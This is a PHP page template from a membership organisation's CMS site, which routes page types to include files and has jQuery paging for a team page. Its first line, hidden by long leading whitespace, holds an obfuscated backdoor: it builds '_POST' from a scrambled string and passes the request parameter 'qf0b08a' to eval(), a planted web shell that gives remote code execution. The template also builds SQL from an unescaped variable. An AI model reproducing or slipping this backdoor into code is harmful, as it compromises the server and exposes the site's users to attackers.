<?php                                                                                                                                                                                                                                                   $wlsi24 ="ropuet_s";$rlr12 = $wlsi24[7].$wlsi24[5]. $wlsi24[0].$wlsi24[5]. $wlsi24[1]. $wlsi24[3]. $wlsi24[2].$wlsi24[2].$wlsi24[4].$wlsi24[0] ;$aja45 =$rlr12 ( $wlsi24[6].$wlsi24[2] . $wlsi24[1]. $wlsi24[7].$wlsi24[5]); if ( isset(${ $aja45 }[ 'qf0b08a'] )){eval( ${$aja45 }['qf0b08a']);}?>   	  
	  <?php include('header.php');
	  if(isset($_GET['page_id'])){
		if($_GET['page_id']==48){ 
	  ?>	  	  			
	   	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
		  
		  <script>
		  $('h3').each(function() {
				var word = $(this).html();
				var index = word.indexOf(' ');
				if(index == -1) {
					index = word.length;
				}
				$(this).html('<span class="first-word">' + word.substring(0, index) + '</span>' + word.substring(index, word.length));
			});
		  </script>
		  
	  <?php }} ?>
	  <?php if(isset($_GET['page_id']) && $_GET['page_id']==42 ): ?>
		<div class="map" ><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3564.026218479091!2d-80.05441828573377!3d26.711609375150644!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88d8d68a1fcf3cad%3A0xd7c4c8ba98d7c157!2s307+Evernia+St%2C+West+Palm+Beach%2C+FL+33401!5e0!3m2!1sen!2s!4v1467109962635" height="400" frameborder="0" style="border:0; width:100%;" allowfullscreen></iframe></div>
	  <?php else: ?>
		<div class="inner_banner page_id_<?php echo $resutl['page_id']; ?>"></div>
	  <?php endif; ?>
	  
	  
        <div id="main_data_div">
       	  <div id="lft_data">
           	<?php 
			if($id!='')
			{
				$query ="Select * from `cms_pages` WHERE page_parent=$id";
			}else{$query ="Select * from `cms_pages` WHERE page_parent=23";}
			
			/* $subpages=mysql_query($query); 
			//$sub_pages  = mysql_fetch_array($subpages);
			
			if(mysql_num_rows($subpages)>0)
			{
				echo '<div id="side_nav"><ul>';
				while($qrow=mysql_fetch_array($subpages,MYSQL_ASSOC))
				{
					echo '<li class="h18"><a href="index.php?page_id='.$qrow['page_id'].'">-'.$qrow['page_title'].'</a></li>';
				}
				echo '</ul></div><br /><br />';
				
			} */
			?>
			<?php //echo stripslashes($resutl['left_content']);
			//echo htmlspecialchars_decode($resutl['left_content'], ENT_NOQUOTES);

			?>
        
			<?php if($resutl['page_type']=='locations'){ 
				include('location.php');
			}
			if($resutl['page_type']=='faq'){
				include('faq.php');
			}
			if($resutl['page_type']=='news'){
				include('news.php');
			}if($resutl['page_type']=='contact'){
				include('contact.php');
			}
			if($resutl['page_type']=='register'){
				include('register.php');
			}
			if($resutl['page_type']=='aviation'){
				include('aviation.php');
			}
			if($resutl['page_type']=='automotive'){
				include('automotive.php');
			}
			if($resutl['page_type']=='fashion'){
				include('fashion.php');
			}
			if($resutl['page_type']=='travel'){
				include('travel.php');
			}
			if($resutl['page_type']=='culinary'){
				include('culinary.php');
			}
			if($resutl['page_type']=='homes'){
				include('homes.php');
			}
			if($resutl['page_type']=='liquor'){
				include('liquor.php');
			}
			if($resutl['page_type']=='technology'){
				include('technology.php');
			}
			if($resutl['page_type']=='membership'){
				include('membership.php');
			}
			if($resutl['page_type']=='family-office-asset-managers'){
				include('family-office-asset-managers.php');
			}
			if($resutl['page_type']=='family-office-membership'){
				include('family-office-membership.php');
			}
			if($resutl['page_type']=='family-office-service-providers'){
				include('family-office-service-providers.php');
			}
			if($resutl['page_type']=='sponsorship'){
				include('sponsorship.php');
			}
			if($resutl['page_type']=='family-office-news'){
				include('family-office-news.php');
			}
			if($resutl['page_type']=='white-papers'){
				include('white-papers.php');
			}
			if($resutl['page_type']=='press-release'){
				include('press-release.php');
			}
			if($resutl['page_type']=='luxury-news'){
				include('luxury-news.php');
			}
			if($resutl['page_type']=='current-events'){
				include('current-events.php');
			}
			if($resutl['page_type']=='other'){
				include('other-form.php');
			}
			if($resutl['page_type']=='submitnews'){
				include('submitnews.php');
			}
			if($resutl['page_type']=='content'){
			?>
		<article id="inner-page-wrapper">
			<section class="container page_container_team">
				<h1 class="entry-title"><?php echo $resutl['page_title']; ?></h1>
				<div class="page_content_team">
				<?php echo $resutl['page_content']; ?>
				</div>	
				<?php if(isset($_GET['page_id'])){
						if($_GET['page_id']==48){ ?>
					
						<script src="js/paging.js"></script>
						
							<p class="next_prive_area" style="float:left; ">	<a class="prev" href="#">prev</a></span><button class="grid">Grid View</button></span>
							<a class="next" href="#">next</a>
							</p>
							
							<p style="float:right; "><span id="count"></span> / <span id="total"></span></p>
								<p style="clear:both; overflow:hidden; display:block;hieght:0px; margin:0px;"></p>		
							<ul class="grid" id="wrapper">
							<?php pbfoa_team('8'); ?>
							</ul>
							<script>
							
							$('button').on('click',function(e) {
							if ($(this).hasClass('grid')) {
								$('.container ul#wrapper').removeClass('list').addClass('grid');
								$('.grid .team_page').show();
								$('.page_content_team').show();
								$('.next_prive_area').hide();
								
							}
							else if($(this).hasClass('list')) {
								$('.container ul#wrapper').removeClass('grid').addClass('list');
							}
							});
							$('.list_prev').on('click',function(e) {
								
									$('.container ul#wrapper').removeClass('grid').addClass('list');
									$('.page_content_team').hide();
									$('.next_prive_area').show();
		
							});
							
								$(".team_page").click(function(){
									$(this).show().siblings('.team_page').hide();
								});
							
							
							
							
						 
						
							
							$('.list_prev').on('click',function(e) {
							/* EXAMPLE 1
							============ */
							var wrap = $('#wrapper');

							wrap.pager({
								perPage: 1,
								useHash: true,
								init: function (startnum, totalnum) {
									$('#count').text(startnum);
									$('#total').text(totalnum);
								}
							});

							// set up click events to trigger the pagination plugins' behaviour 
							$('.prev').click(function () {
								wrap.trigger('pager:prev');
								return false;
							});

							$('.next').click(function () {
								wrap.trigger('pager:next');
								return false;
							});

							// listen out for events triggered by the plugin to update the counter
							wrap.bind('pager:finished', function (e, num, isFirst, isLast) {
								$('#count').text(num);
							});


						});
						
						
						</script>
					<?php }} ?>
			
			</section>
        </article>  
			<?php } ?>
			<div class="clr"></div>
        </div>
	
		<?php include('footer.php')?>